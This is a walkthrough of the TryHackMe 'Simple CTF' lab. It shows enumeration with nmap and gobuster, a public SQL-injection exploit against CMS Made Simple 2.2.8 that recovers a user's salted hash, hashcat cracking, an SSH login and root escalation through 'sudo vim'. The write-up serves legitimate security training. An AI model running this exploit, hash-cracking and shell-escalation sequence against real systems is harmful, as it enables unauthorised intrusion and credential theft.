# Try Hack Me - Simple CTF

[https://tryhackme.com/room/easyctf](https://tryhackme.com/room/easyctf)

This CTF was carried out using a local install of Kali Linux. The machine to be exploited was accessed by VPN.

Ip address 10.10.199.87

## Initial enumeration with nmap

An intial scan of the services running on the machine was carried out using namp.
```
$ sudo nmap -sC -sV -O -oN nmap.txt $IPADDR  
```
### Ports and Services
- 21 ftp - vsftpd 3.0.3
- 80 httpd - Apache 2.4.18
- 2222 ssh - OpenSSH 7.2p2

The FTP allows anonymous login. I also used searchsploit to check for any known venerabilites on the FTP server.

```
$ searchsploit vsFTPd                      
------------------------------------------------- ---------------------------------
 Exploit Title                                   |  Path
------------------------------------------------- ---------------------------------
vsftpd 2.0.5 - 'CWD' (Authenticated) Remote Memo | linux/dos/5814.pl
vsftpd 2.0.5 - 'deny_file' Option Remote Denial  | windows/dos/31818.sh
vsftpd 2.0.5 - 'deny_file' Option Remote Denial  | windows/dos/31819.pl
vsftpd 2.3.2 - Denial of Service                 | linux/dos/16270.c
vsftpd 2.3.4 - Backdoor Command Execution (Metas | unix/remote/17491.rb
------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
As the machine uses vsftpd 3.0.3 none of these are applicable.

## Gobuster
Trying the IP address for the machine in web browser just gives a default Apache landing page. The http server was enumerated further with Gobuster.

```
$ gobuster dir -u http://$IPADDR  -w /usr/share/wordlists/dirb/common.txt   | tee gobuster.txt 

...

===============================================================
2021/03/18 20:06:42 Starting gobuster in directory enumeration mode
===============================================================

/.hta                 (Status: 403) [Size: 291]

/.htpasswd            (Status: 403) [Size: 296]

/.htaccess            (Status: 403) [Size: 296]

/index.html           (Status: 200) [Size: 11321]

/robots.txt           (Status: 200) [Size: 929]  

/server-status        (Status: 403) [Size: 300]  

/simple               (Status: 301) [Size: 313] [--> http://10.10.199.87/simple/]
===============================================================
2021/03/18 20:07:04 Finished
===============================================================
```

This gives us another directory called simple to explore.

```
$ gobuster dir -u http://$IPADDR/simple  -w /usr/share/wordlists/dirb/common.txt   | tee gobuster2.txt 

...

===============================================================
2021/03/18 20:09:49 Starting gobuster in directory enumeration mode
===============================================================

/.htaccess            (Status: 403) [Size: 303]

/.hta                 (Status: 403) [Size: 298]

/.htpasswd            (Status: 403) [Size: 303]

/admin                (Status: 301) [Size: 319] [--> http://10.10.199.87/simple/admin/]

/assets               (Status: 301) [Size: 320] [--> http://10.10.199.87/simple/assets/]

/doc                  (Status: 301) [Size: 317] [--> http://10.10.199.87/simple/doc/]   

/index.php            (Status: 200) [Size: 19913]                                       

/lib                  (Status: 301) [Size: 317] [--> http://10.10.199.87/simple/lib/]   

/modules              (Status: 301) [Size: 321] [--> http://10.10.199.87/simple/modules/]

/tmp                  (Status: 301) [Size: 317] [--> http://10.10.199.87/simple/tmp/]    

/uploads              (Status: 301) [Size: 321] [--> http://10.10.199.87/simple/uploads/]
===============================================================
2021/03/18 20:10:10 Finished
===============================================================
```

Opening http://IPADDR/simple/ in a web browser gives a login page for a CMS. In particular CMSMS or CMS Made Simple.

## CMS Made Simple 

An initial search for venerabilites in CMS Made Simple was carried out using Searchsploit. Initially this give only a single result.

```
$ searchsploit cmsms
------------------------------------------------- ---------------------------------
 Exploit Title                                   |  Path
------------------------------------------------- ---------------------------------
CMS Made Simple (CMSMS) Showtime2 - File Upload  | php/remote/46627.rb
------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

```
$ searchsploit -p 46627
  Exploit: CMS Made Simple (CMSMS) Showtime2 - File Upload Remote Code Execution (Metasploit)
      URL: https://www.exploit-db.com/exploits/46627
     Path: /usr/share/exploitdb/exploits/php/remote/46627.rb
File Type: Ruby script, ASCII text, with CRLF line terminators
```
Specifically this made use of ruby and Metasploit which seemed perhaps too complicated for an introductory CTF. At this point I did a google search for other walkthroughs [https://kalana-dananjaya.medium.com/easyctf-writeup-pentesting-cb756f0e7dbd
](https://kalana-dananjaya.medium.com/easyctf-writeup-pentesting-cb756f0e7dbd). This seemed to indicate that where perhaps more venerabilites so I returned to searchsploit.
```
$ searchsploit cms made simple
------------------------------------------------- ---------------------------------
 Exploit Title                                   |  Path
------------------------------------------------- ---------------------------------
CMS Made Simple (CMSMS) Showtime2 - File Upload  | php/remote/46627.rb
CMS Made Simple 0.10 - 'index.php' Cross-Site Sc | php/webapps/26298.txt
CMS Made Simple 0.10 - 'Lang.php' Remote File In | php/webapps/26217.html
CMS Made Simple 1.0.2 - 'SearchInput' Cross-Site | php/webapps/29272.txt
CMS Made Simple 1.0.5 - 'Stylesheet.php' SQL Inj | php/webapps/29941.txt
CMS Made Simple 1.11.10 - Multiple Cross-Site Sc | php/webapps/32668.txt
CMS Made Simple 1.11.9 - Multiple Vulnerabilitie | php/webapps/43889.txt
CMS Made Simple 1.2 - Remote Code Execution      | php/webapps/4442.txt
CMS Made Simple 1.2.2 Module TinyMCE - SQL Injec | php/webapps/4810.txt
CMS Made Simple 1.2.4 Module FileManager - Arbit | php/webapps/5600.php
CMS Made Simple 1.4.1 - Local File Inclusion     | php/webapps/7285.txt
CMS Made Simple 1.6.2 - Local File Disclosure    | php/webapps/9407.txt
CMS Made Simple 1.6.6 - Local File Inclusion / C | php/webapps/33643.txt
CMS Made Simple 1.6.6 - Multiple Vulnerabilities | php/webapps/11424.txt
CMS Made Simple 1.7 - Cross-Site Request Forgery | php/webapps/12009.html
CMS Made Simple 1.8 - 'default_cms_lang' Local F | php/webapps/34299.py
CMS Made Simple 1.x - Cross-Site Scripting / Cro | php/webapps/34068.html
CMS Made Simple 2.1.6 - 'cntnt01detailtemplate'  | php/webapps/48944.py
CMS Made Simple 2.1.6 - Multiple Vulnerabilities | php/webapps/41997.txt
CMS Made Simple 2.1.6 - Remote Code Execution    | php/webapps/44192.txt
CMS Made Simple 2.2.14 - Arbitrary File Upload ( | php/webapps/48779.py
CMS Made Simple 2.2.14 - Authenticated Arbitrary | php/webapps/48742.txt
CMS Made Simple 2.2.14 - Persistent Cross-Site S | php/webapps/48851.txt
CMS Made Simple 2.2.15 - RCE (Authenticated)     | php/webapps/49345.txt
CMS Made Simple 2.2.15 - Stored Cross-Site Scrip | php/webapps/49199.txt
CMS Made Simple 2.2.5 - (Authenticated) Remote C | php/webapps/44976.py
CMS Made Simple 2.2.7 - (Authenticated) Remote C | php/webapps/45793.py
CMS Made Simple < 1.12.1 / < 2.1.3 - Web Server  | php/webapps/39760.txt
CMS Made Simple < 2.2.10 - SQL Injection         | php/webapps/46635.py
CMS Made Simple Module Antz Toolkit 1.02 - Arbit | php/webapps/34300.py
CMS Made Simple Module Download Manager 1.4.1 -  | php/webapps/34298.py
CMS Made Simple Showtime2 Module 3.6.2 - (Authen | php/webapps/46546.py
------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
The CMS Made Simple landing page at http://IPADDR/simple/ showed that the machine was running version 2.2.8. One particular entry that stood out applied to all versions less than 2.2.10 and involved SQL injection.

```
$ searchsploit -p 46635       
  Exploit: CMS Made Simple < 2.2.10 - SQL Injection
      URL: https://www.exploit-db.com/exploits/46635
     Path: /usr/share/exploitdb/exploits/php/webapps/46635.py
File Type: Python script, ASCII text executable, with CRLF line terminators
```

```
$ searchsploit -m 46635 
```

This gives a python module which should do most of the hard work for us.

The python script needs an ip address and an optional worldlist if the -c flag is set. I had some problems running the script initially due to the script being written for python2 but my system favouring python3 as well as some missing dependencies (termcolor and requests). Once these where resolved I was able to run the script without a wordlist and the crack flag set to give the following result: 

```
$ python 46635.py -u http://$IPADDR/simple

...

[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
```

So we have a user named mitch, a salt and a password hash. At this time I couldn't get the script to crack the password has as python interpreter was complaining about problems with unicode when loading strings from the wordlist.

An initial attempt to try and find the password using John The Ripper didn't work out as I couldn't get the username, salt and hash into a format that it was happy with.

## Does FTP give anything?
As a diversion with issues with python, unicode and hashes I decided to explore the FTP a little more. 

```
$ ftp $IPADDR
Connected to 10.10.199.87.
220 (vsFTPd 3.0.3)
Name (10.10.199.87:james): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 17  2019 pub
226 Directory send OK.
ftp> cd ftp
550 Failed to change directory.
ftp> ls ftp
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
226 Directory send OK.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 17  2019 pub
226 Directory send OK.
ftp> ls pub
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp           166 Aug 17  2019 ForMitch.txt
226 Directory send OK.
ftp> get pub/ForMitch.txt
local: pub/ForMitch.txt remote: pub/ForMitch.txt
local: pub/ForMitch.txt: No such file or directory
ftp> cd pub
250 Directory successfully changed.
ftp> get ForMitch.txt
local: ForMitch.txt remote: ForMitch.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for ForMitch.txt (166 bytes).
226 Transfer complete.
166 bytes received in 0.00 secs (433.4475 kB/s)
ftp> 
```
I'm not particularly farmiliar with the command line FTP client but I did manage to download a file ForMitch.txt. Reading the file confirms that mitch has a weak password.
```
$ cat ForMitch.txt 
Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!
                                   
```
## Resolving python issues
At this point I returned to the python script and fixed the issues with the unicode strings. Running the script again with the wordlist and the -c flag set.

```
$ python 46635.py -u http://$IPADDR/simple --crack -w /usr/share/seclists/Passwords/Common-Credentials/best110.txt

[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: [REDACTED]
```

## Logging in using ssh
So now with a user anme and password I was able to login to the machine using ssh.

```
$ ssh mitch@10.10.199.87 -p 2222
The authenticity of host '[10.10.199.87]:2222 ([10.10.199.87]:2222)' can't be established.
ECDSA key fingerprint is SHA256:Fce5J4GBLgx1+iaSMBjO+NFKOjZvL5LOVF5/jc0kwt8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.199.87]:2222' (ECDSA) to the list of known hosts.
mitch@10.10.199.87's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
$ 
```
## Looking for the user flag
Finding the user flag and the names of other users was now quite straight forward.
```
$ls
user.txt
$ cat user.txt	
[REDACTED]
$ ls /home
mitch  [REDACTED]
```

## Looking for the root flag
Looking for the root flag would be trickier.
```
$ ls -al
total 36
drwxr-x--- 3 mitch mitch 4096 aug 19  2019 .
drwxr-xr-x 4 root  root  4096 aug 17  2019 ..
-rw------- 1 mitch mitch  178 aug 17  2019 .bash_history
-rw-r--r-- 1 mitch mitch  220 sep  1  2015 .bash_logout
-rw-r--r-- 1 mitch mitch 3771 sep  1  2015 .bashrc
drwx------ 2 mitch mitch 4096 aug 19  2019 .cache
-rw-r--r-- 1 mitch mitch  655 mai 16  2017 .profile
-rw-rw-r-- 1 mitch mitch   19 aug 17  2019 user.txt
-rw------- 1 mitch mitch  515 aug 17  2019 .viminfo

$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim

```
After running these commands we see that mitch can run Vim with root priveleges. After refering to [https://gtfobins.github.io/](https://gtfobins.github.io/) I found out how this can be exploited.

```
$ sudo vim -c ':!/bin/sh'


# ls /
bin    dev   initrd.img      lost+found  opt   run   srv  usr	   vmlinuz.old
boot   etc   initrd.img.old  media	 proc  sbin  sys  var
cdrom  home  lib	     mnt	 root  snap  tmp  vmlinuz
# ls root
ls: cannot access 'root': No such file or directory
# ls /root    
root.txt
# cat /root/root.txt
[REDACTED]
```

## Afterwards

### Using searchsploit
The version of a particular application can be given to searchsploit to narrow down applicable exploits.
```
$ searchsploit CMS Made Simple 2.2.8                                                             2 ⨯
--------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                       |  Path
--------------------------------------------------------------------- ---------------------------------
CMS Made Simple < 2.2.10 - SQL Injection                             | php/webapps/46635.py
--------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

### Recover password without wordlist and crack option

I was keen to find out how to crack the hash without using the crack and wordlist options provided by the exploit python script. After some googling  I found it was possible to put the password hash follwed by salt in a file (pw.txt).  
```
0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2
```
And then crack with hashcat.

```
$ hashcat -v -a 0 -m 20 pw.txt /usr/share/wordlists/rockyou.txt -O                                                                                              130 ⨯
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Celeron(R) CPU  N3050  @ 1.60GHz, 2818/2882 MB (1024 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 31
Minimim salt length supported by kernel: 0
Maximum salt length supported by kernel: 51

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Optimized-Kernel
* Zero-Byte
* Precompute-Init
* Early-Skip
* Not-Iterated
* Prepended-Salt
* Single-Hash
* Single-Salt
* Raw-Hash

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 64 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 7 secs

0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2:[REDACTED]
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: md5($salt.$pass)
Hash.Target......: 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2
Time.Started.....: Fri Mar 19 09:54:37 2021 (0 secs)
Time.Estimated...: Fri Mar 19 09:54:37 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     7627 H/s (1.38ms) @ Accel:1024 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests
Progress.........: 2048/14344385 (0.01%)
Rejected.........: 0/2048 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: 123456 -> lovers1

Started: Fri Mar 19 09:53:10 2021
Stopped: Fri Mar 19 09:54:40 2021
```
